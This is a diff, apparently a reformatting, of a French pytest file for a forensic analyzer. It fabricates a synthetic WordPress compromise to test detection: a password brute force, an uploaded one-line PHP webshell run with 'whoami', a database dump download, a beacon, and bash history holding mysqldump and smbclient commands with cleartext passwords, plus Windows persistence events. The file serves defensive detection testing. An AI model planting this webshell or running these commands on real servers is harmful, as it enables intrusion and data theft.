@@ -1,6 +1,7 @@
 """Chaîne d'attaque WordPress (brute-force, webshell, exfiltration, balise, pivot) : chaque étape
 doit être retrouvée, attribuée au bon rôle et donner des règles utilisables. Données synthétiques
 reprenant les faiblesses constatées sur le TP Sentinelle."""
+
 from __future__ import annotations
 
 import os
@@ -27,16 +28,54 @@ def _attack_pcap(path):
     for i in range(30):
         port = 41000 + i % 10
         pwd = "Admin2025%21" if i == 29 else f"Pass{i:04d}"
-        pkts.append(_http(ATTACKER, port, SERVER, 80,
-                          f"POST /wp-login.php HTTP/1.1\r\nHost: {SERVER}\r\nUser-Agent: axios/0.21.1\r\n\r\nlog=admin&pwd={pwd}".encode(), t))
-        reply = (b"HTTP/1.1 302 Found\r\nLocation: /wp-admin/\r\nSet-Cookie: wordpress_logged_in_x=admin\r\n\r\n" if i == 29
-                 else b"HTTP/1.1 200 OK\r\nContent-Length: 9\r\n\r\nbad login")
+        pkts.append(
+            _http(
+                ATTACKER,
+                port,
+                SERVER,
+                80,
+                f"POST /wp-login.php HTTP/1.1\r\nHost: {SERVER}\r\nUser-Agent: axios/0.21.1\r\n\r\nlog=admin&pwd={pwd}".encode(),
+                t,
+            )
+        )
+        reply = (
+            b"HTTP/1.1 302 Found\r\nLocation: /wp-admin/\r\nSet-Cookie: wordpress_logged_in_x=admin\r\n\r\n"
+            if i == 29
+            else b"HTTP/1.1 200 OK\r\nContent-Length: 9\r\n\r\nbad login"
+        )
         pkts.append(_http(SERVER, 80, ATTACKER, port, reply, t + 0.01))
         t += 1
-    pkts.append(_http(ATTACKER, 42001, SERVER, 80, b"POST /wp-admin/async-upload.php HTTP/1.1\r\nUser-Agent: axios/0.21.1\r\n\r\n"
-                      b'Content-Disposition: form-data; name="async-upload"; filename="x.php"\r\n\r\n<?php system($_REQUEST["c"]); ?>', t))
-    pkts.append(_http(ATTACKER, 42002, SERVER, 80, b"GET /wp-content/uploads/x.php?c=whoami HTTP/1.1\r\nUser-Agent: axios/0.21.1\r\n\r\n", t + 1))
-    pkts.append(_http(ATTACKER, 42003, SERVER, 80, b"GET /wp-content/uploads/dump.sql.gz HTTP/1.1\r\nUser-Agent: axios/0.21.1\r\n\r\n", t + 2))
+    pkts.append(
+        _http(
+            ATTACKER,
+            42001,
+            SERVER,
+            80,
+            b"POST /wp-admin/async-upload.php HTTP/1.1\r\nUser-Agent: axios/0.21.1\r\n\r\n"
+            b'Content-Disposition: form-data; name="async-upload"; filename="x.php"\r\n\r\n<?php system($_REQUEST["c"]); ?>',
+            t,
+        )
+    )
+    pkts.append(
+        _http(
+            ATTACKER,
+            42002,
+            SERVER,
+            80,
+            b"GET /wp-content/uploads/x.php?c=whoami HTTP/1.1\r\nUser-Agent: axios/0.21.1\r\n\r\n",
+            t + 1,
+        )
+    )
+    pkts.append(
+        _http(
+            ATTACKER,
+            42003,
+            SERVER,
+            80,
+            b"GET /wp-content/uploads/dump.sql.gz HTTP/1.1\r\nUser-Agent: axios/0.21.1\r\n\r\n",
+            t + 2,
+        )
+    )
     pkts.append(_http(CLIENT, 50000, SERVER, 80, b"GET / HTTP/1.1\r\nUser-Agent: curl/7.88\r\n\r\n", t + 3))
     pkts.append(_http(SERVER, 51000, ATTACKER, 4444, b"GET /beacon?host=web-01 HTTP/1.1\r\n\r\n", t + 4))
     syn = scapy.IP(src=SERVER, dst=LAN) / scapy.TCP(sport=50500, dport=445, flags="S")
@@ -49,12 +88,13 @@ def _attack_pcap(path):
 @pytest.fixture
 def pcap_finding(tmp_path):
     from forensic_analyzer.analyzers.pcap import PCAPAnalyzer
+
     return PCAPAnalyzer().analyze(_attack_pcap(tmp_path / "traffic.pcap"))
 
 
 def test_pcap_reconstructs_the_attack_chain(pcap_finding):
     attack = pcap_finding.extra["http_attack"]
-    assert attack["brute_force"][0]["attempts"] == 30          # ports source réutilisés : rien n'est perdu
+    assert attack["brute_force"][0]["attempts"] == 30  # ports source réutilisés : rien n'est perdu
     assert attack["brute_force"][0]["winning_credential"] == "admin / Admin2025!"
     assert attack["uploads"][0]["filename"] == "x.php" and attack["uploads"][0]["php"]
     assert [c["command"] for c in attack["webshell_commands"]] == ["whoami"]
@@ -67,7 +107,7 @@ def test_pcap_reconstructs_the_attack_chain(pcap_finding):
 
 def test_pcap_reports_only_the_working_password_and_ranks_user_agents(pcap_finding):
     creds = pcap_finding.extra["credentials"]
-    assert creds[0]["password"] == "Admin2025!" and len(creds) == 1   # les essais ne sont pas des identifiants
+    assert creds[0]["password"] == "Admin2025!" and len(creds) == 1  # les essais ne sont pas des identifiants
     ranked = {u["user_agent"]: u["verdict"] for u in pcap_finding.extra["http_attack"]["user_agents"]}
     assert ranked["axios/0.21.1"] == "attaquant" and ranked["curl/7.88"] == "outil automatisé"
 
@@ -83,8 +123,10 @@ def test_rules_target_the_attacker_not_the_victim(pcap_finding, tmp_path):
 
 
 _ACCESS_LOG = (
-    "".join(f'{ATTACKER} - - [25/Oct/2026:06:48:{i:02d} +0000] "POST /wp-login.php HTTP/1.1" 200 20 "-" "axios/0.21.1"\n'
-            for i in range(25))
+    "".join(
+        f'{ATTACKER} - - [25/Oct/2026:06:48:{i:02d} +0000] "POST /wp-login.php HTTP/1.1" 200 20 "-" "axios/0.21.1"\n'
+        for i in range(25)
+    )
     + f'{ATTACKER} - - [25/Oct/2026:07:03:00 +0000] "POST /wp-login.php HTTP/1.1" 302 0 "-" "axios/0.21.1"\n'
     + f'{CLIENT} - - [25/Oct/2026:07:04:00 +0000] "POST /wp-login.php HTTP/1.1" 200 20 "-" "Mozilla/5.0"\n'
     + f'{ATTACKER} - - [25/Oct/2026:07:05:00 +0000] "POST /wp-admin/async-upload.php HTTP/1.1" 200 120 "-" "axios/0.21.1"\n'
@@ -99,9 +141,16 @@ def test_web_log_groups_brute_force_and_keeps_later_attack_steps(tmp_path):
     log = tmp_path / "nginx-access.log"
     log.write_text(_ACCESS_LOG)
     res = parse_web_access_log(str(log))
-    assert res["brute_force"] == [{"ip": ATTACKER, "attempts": 26, "first": res["brute_force"][0]["first"],
-                                   "last": res["brute_force"][0]["last"], "succeeded": True}]
-    assert res["attackers"] == [ATTACKER]                       # le client légitime n'est pas un indicateur
+    assert res["brute_force"] == [
+        {
+            "ip": ATTACKER,
+            "attempts": 26,
+            "first": res["brute_force"][0]["first"],
+            "last": res["brute_force"][0]["last"],
+            "succeeded": True,
+        }
+    ]
+    assert res["attackers"] == [ATTACKER]  # le client légitime n'est pas un indicateur
     kinds = [e["event_type"] for e in res["events"]]
     # Les étapes après le brute-force ne sont plus évincées par les tentatives de connexion
     assert {"brute_force", "auth_success", "upload", "webshell_command", "exfiltration"} <= set(kinds)
@@ -112,10 +161,12 @@ def test_syslog_notable_events_and_year_from_mtime(tmp_path):
     from forensic_analyzer.analyzers.log_analyzer.parsers import parse_syslog_file
 
     log = tmp_path / "syslog"
-    log.write_text("Oct 25 07:08:20 web-01 sudo:   www-data : NOT in sudoers\n"
-                   "Oct 25 07:38:00 web-01 cron[1]: (*system*) RELOAD (/etc/cron.d/updater)\n"
-                   f"Oct 25 07:39:02 web-01 www-data: LOGIN SUCCESS user=admin from {ATTACKER} (via php)\n")
-    os.utime(log, (1_793_000_000, 1_793_000_000))   # fin octobre 2026
+    log.write_text(
+        "Oct 25 07:08:20 web-01 sudo:   www-data : NOT in sudoers\n"
+        "Oct 25 07:38:00 web-01 cron[1]: (*system*) RELOAD (/etc/cron.d/updater)\n"
+        f"Oct 25 07:39:02 web-01 www-data: LOGIN SUCCESS user=admin from {ATTACKER} (via php)\n"
+    )
+    os.utime(log, (1_793_000_000, 1_793_000_000))  # fin octobre 2026
     res = parse_syslog_file(str(log))
     assert [n["type"] for n in res["notable"]] == ["sudo_denied", "cron_reload", "app_login"]
     assert res["notable_ips"] == [ATTACKER]
@@ -127,7 +178,9 @@ def test_nginx_error_timestamps_are_valid_iso(tmp_path):
     from forensic_analyzer.core.timeline import parse_ts
 
     log = tmp_path / "nginx-error.log"
-    log.write_text(f'2026/10/25 06:48:00 [error] 123#0: *1 limiting requests, excess: 10.000 by zone "login", client: {ATTACKER}\n')
+    log.write_text(
+        f'2026/10/25 06:48:00 [error] 123#0: *1 limiting requests, excess: 10.000 by zone "login", client: {ATTACKER}\n'
+    )
     event = parse_web_error_log(str(log))["events"][0]
     assert parse_ts(event["timestamp"]) is not None and "brute-force" in event["description"]
 
@@ -136,8 +189,10 @@ def test_bash_history_flags_pivot_dump_and_cleartext_passwords(tmp_path):
     from forensic_analyzer.analyzers.linux.analyzer import parse_bash_history
 
     hist = tmp_path / ".bash_history"
-    hist.write_text("cat /var/www/html/wp-config.php\nmysqldump -uwp -pwpPass2025! wordpress | gzip > dump.sql.gz\n"
-                    f"curl -s http://{LAN}:445\nsmbclient -U wp%wpPass2025! //{LAN}/public\nls\n")
+    hist.write_text(
+        "cat /var/www/html/wp-config.php\nmysqldump -uwp -pwpPass2025! wordpress | gzip > dump.sql.gz\n"
+        f"curl -s http://{LAN}:445\nsmbclient -U wp%wpPass2025! //{LAN}/public\nls\n"
+    )
     res = parse_bash_history(str(hist))
     assert res["suspicious_commands"] == 4
     assert {c["password"] for c in res["cleartext_passwords"]} == {"wpPass2025!"}
@@ -148,9 +203,11 @@ def test_xml_is_not_a_webshell_and_nmap_hosts_without_status_count(tmp_path):
     from forensic_analyzer.analyzers.webshell import WebshellAnalyzer
 
     xml = tmp_path / "nmap.xml"
-    xml.write_text('<?xml version="1.0"?><nmaprun scanner="nmap" args="nmap -sV 192.0.2.0/28"><host>'
-                   f'<address addr="{SERVER}" addrtype="ipv4"/><ports><port protocol="tcp" portid="80">'
-                   '<state state="open"/><service name="http" product="nginx" version="1.25.3"/></port></ports></host></nmaprun>')
+    xml.write_text(
+        '<?xml version="1.0"?><nmaprun scanner="nmap" args="nmap -sV 192.0.2.0/28"><host>'
+        f'<address addr="{SERVER}" addrtype="ipv4"/><ports><port protocol="tcp" portid="80">'
+        '<state state="open"/><service name="http" product="nginx" version="1.25.3"/></port></ports></host></nmaprun>'
+    )
     assert not WebshellAnalyzer().can_handle(str(xml))
     meta = NmapAnalyzer().analyze(str(xml)).metadata
     assert meta["Hôtes actifs découverts"] == "1" and "(http nginx 1.25.3)" in meta[f"Cible #1 : {SERVER}"]
@@ -174,16 +231,25 @@ def test_integrity_separates_missing_files_from_alteration(tmp_path):
     manifest.write_text(f"{'0' * 64}  ./absent.txt\n")
     assert IntegrityAnalyzer().analyze(str(manifest), phase="initiale").metadata["Verdict"].startswith("Vérification incomplète")
     manifest.write_text(f"{'0' * 64}  a.txt\n")
-    assert IntegrityAnalyzer().analyze(str(manifest), phase="initiale").metadata["Verdict"].startswith("[ALERTE] Preuves altérées")
+    assert (
+        IntegrityAnalyzer().analyze(str(manifest), phase="initiale").metadata["Verdict"].startswith("[ALERTE] Preuves altérées")
+    )
 
 
 def test_identified_software_only_gets_a_hash_rule(tmp_path):
     from forensic_analyzer.output.rules_generator import DefenseRulesGenerator
 
-    busybox = FindingModel(type="elf_analysis", file="/e/suspicious-binary",
-                           metadata={"SHA-256": "a" * 64, "Identification": "BusyBox 1.38.0",
-                                     "Capacité : Réseau sortant": "connect", "Capacité : Exécution de commandes": "execve"},
-                           extra={"iocs": {"paths": ["/etc/motd", "/var/run/crond.reboot"]}})
+    busybox = FindingModel(
+        type="elf_analysis",
+        file="/e/suspicious-binary",
+        metadata={
+            "SHA-256": "a" * 64,
+            "Identification": "BusyBox 1.38.0",
+            "Capacité : Réseau sortant": "connect",
+            "Capacité : Exécution de commandes": "execve",
+        },
+        extra={"iocs": {"paths": ["/etc/motd", "/var/run/crond.reboot"]}},
+    )
     out = DefenseRulesGenerator().generate(ReportModel.from_findings([busybox]), output_dir=str(tmp_path))
     yar = open(out["yara"]).read()
     assert "FA_Known_Hashes" in yar and "rule FA_ELF_" not in yar
@@ -206,22 +272,30 @@ def test_pcap_clock_is_aligned_on_an_ip_seen_on_both_sides():
 
     events = [
         {"timestamp": "2026-10-25T06:12:04+00:00", "source": "web_access", "description": f"Reconnaissance depuis {ATTACKER}"},
-        {"timestamp": "2026-10-30T13:32:04+00:00", "source": "pcap", "description": f"Connexion TCP {ATTACKER}:40000 -> {SERVER}:21"},
+        {
+            "timestamp": "2026-10-30T13:32:04+00:00",
+            "source": "pcap",
+            "description": f"Connexion TCP {ATTACKER}:40000 -> {SERVER}:21",
+        },
         {"timestamp": "2026-10-30T14:27:04+00:00", "source": "pcap", "description": "Début du brute-force HTTP"},
     ]
     clock = align_pcap_clock(events)
     assert clock["anchor"] == ATTACKER and clock["offset_seconds"] == (5 * 24 * 60 + 7 * 60 + 20) * 60
     shifted = [e for e in events if e["source"] == "pcap"]
     assert shifted[0]["timestamp"].startswith("2026-10-25T06:12:04")
-    assert shifted[0]["timestamp_origine"].startswith("2026-10-30T13:32:04")   # heure d'origine conservée
+    assert shifted[0]["timestamp_origine"].startswith("2026-10-30T13:32:04")  # heure d'origine conservée
 
 
 def test_routine_ssh_logins_are_collapsed_per_account_and_source(tmp_path):
     from forensic_analyzer.analyzers.log_analyzer.parsers import parse_syslog_file
 
     log = tmp_path / "auth.log"
-    log.write_text("".join(f"Oct 25 06:{i:02d}:00 web-01 sshd[1]: Accepted publickey for ops from 192.0.2.{11 + i % 2} port 1\n"
-                           for i in range(40)))
+    log.write_text(
+        "".join(
+            f"Oct 25 06:{i:02d}:00 web-01 sshd[1]: Accepted publickey for ops from 192.0.2.{11 + i % 2} port 1\n"
+            for i in range(40)
+        )
+    )
     res = parse_syslog_file(str(log))
     assert res["auth_successes"] == 40 and len(res["events"]) == 2
     assert res["ssh_sources"] == ["ops@192.0.2.11", "ops@192.0.2.12"]
@@ -232,9 +306,11 @@ _NS = "http://schemas.microsoft.com/win/2004/08/events/event"
 
 def _evtx_xml(eid, ts, data, provider="Microsoft-Windows-Security-Auditing", channel="Security"):
     fields = "".join(f'<Data Name="{k}">{v}</Data>' for k, v in data.items())
-    return (f'<Event xmlns="{_NS}"><System><Provider Name="{provider}"/><EventID>{eid}</EventID>'
-            f'<TimeCreated SystemTime="{ts}"/><Channel>{channel}</Channel><Computer>DC01</Computer></System>'
-            f"<EventData>{fields}</EventData></Event>")
+    return (
+        f'<Event xmlns="{_NS}"><System><Provider Name="{provider}"/><EventID>{eid}</EventID>'
+        f'<TimeCreated SystemTime="{ts}"/><Channel>{channel}</Channel><Computer>DC01</Computer></System>'
+        f"<EventData>{fields}</EventData></Event>"
+    )
 
 
 def test_evtx_detections_feed_metadata_timeline_and_iocs(tmp_path, monkeypatch):
@@ -243,24 +319,48 @@ def test_evtx_detections_feed_metadata_timeline_and_iocs(tmp_path, monkeypatch):
     from forensic_analyzer.core import iocs
 
     spray = "198.51.100.7"
-    records = [_evtx_xml(4625, f"2026-10-25T06:00:{i:02d}Z", {"TargetUserName": f"user{i % 6}", "IpAddress": spray})
-               for i in range(12)]
+    records = [
+        _evtx_xml(4625, f"2026-10-25T06:00:{i:02d}Z", {"TargetUserName": f"user{i % 6}", "IpAddress": spray}) for i in range(12)
+    ]
     records += [
         _evtx_xml(4624, "2026-10-25T06:01:00Z", {"TargetUserName": "user3", "IpAddress": spray, "LogonType": "10"}),
         _evtx_xml(1102, "2026-10-25T06:30:00Z", {}),
-        _evtx_xml(7045, "2026-10-25T06:05:00Z", {"ServiceName": "updater", "ImagePath": "cmd.exe /c C:\\Users\\Public\\x.bat"},
-                  provider="Service Control Manager", channel="System"),
-        _evtx_xml(4104, "2026-10-25T06:06:00Z", {"ScriptBlockText": "powershell -nop -enc SQBFAFgA "},
-                  provider="Microsoft-Windows-PowerShell", channel="Microsoft-Windows-PowerShell/Operational"),
-        _evtx_xml(13, "2026-10-25T06:07:00Z", {"TargetObject": "HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd",
-                                               "Details": "C:\\Users\\Public\\x.exe"},
-                  provider="Microsoft-Windows-Sysmon", channel="Microsoft-Windows-Sysmon/Operational"),
+        _evtx_xml(
+            7045,
+            "2026-10-25T06:05:00Z",
+            {"ServiceName": "updater", "ImagePath": "cmd.exe /c C:\\Users\\Public\\x.bat"},
+            provider="Service Control Manager",
+            channel="System",
+        ),
+        _evtx_xml(
+            4104,
+            "2026-10-25T06:06:00Z",
+            {"ScriptBlockText": "powershell -nop -enc SQBFAFgA "},
+            provider="Microsoft-Windows-PowerShell",
+            channel="Microsoft-Windows-PowerShell/Operational",
+        ),
+        _evtx_xml(
+            13,
+            "2026-10-25T06:07:00Z",
+            {
+                "TargetObject": "HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd",
+                "Details": "C:\\Users\\Public\\x.exe",
+            },
+            provider="Microsoft-Windows-Sysmon",
+            channel="Microsoft-Windows-Sysmon/Operational",
+        ),
     ]
 
     class FakeLog:
-        def __init__(self, path): pass
-        def __enter__(self): return self
-        def __exit__(self, *a): return False
+        def __init__(self, path):
+            pass
+
+        def __enter__(self):
+            return self
+
+        def __exit__(self, *a):
+            return False
+
         def records(self):
             return [type("R", (), {"xml": lambda self, x=x: x})() for x in records]
 
@@ -270,11 +370,20 @@ def test_evtx_detections_feed_metadata_timeline_and_iocs(tmp_path, monkeypatch):
     f = evtx_mod.EVTXAnalyzer().analyze(str(tmp_path / "Security.evtx"))
 
     kinds = {d["kind"] for d in f.extra["detections"]}
-    assert {"password_spraying", "success_after_failures", "log_cleared", "service_installed",
-            "suspicious_command", "registry_persistence"} <= kinds
-    assert f.extra["detections"][0]["severity"] == "critique"            # critiques en tête
+    assert {
+        "password_spraying",
+        "success_after_failures",
+        "log_cleared",
+        "service_installed",
+        "suspicious_command",
+        "registry_persistence",
+    } <= kinds
+    assert f.extra["detections"][0]["severity"] == "critique"  # critiques en tête
     assert {"T1110.003", "T1070.001", "T1543.003", "T1547.001"} <= set(f.extra["mitre"])
-    assert "RDP" in f.metadata["Connexions distantes (réseau / RDP)"] or "type 10" in f.metadata["Connexions distantes (réseau / RDP)"]
+    assert (
+        "RDP" in f.metadata["Connexions distantes (réseau / RDP)"]
+        or "type 10" in f.metadata["Connexions distantes (réseau / RDP)"]
+    )
     timeline = build_timeline(ReportModel.from_findings([f]))
     assert any(e["event_type"] == "détection log_cleared" for e in timeline)
     assert spray in {i.value for i in iocs.collect([f])}
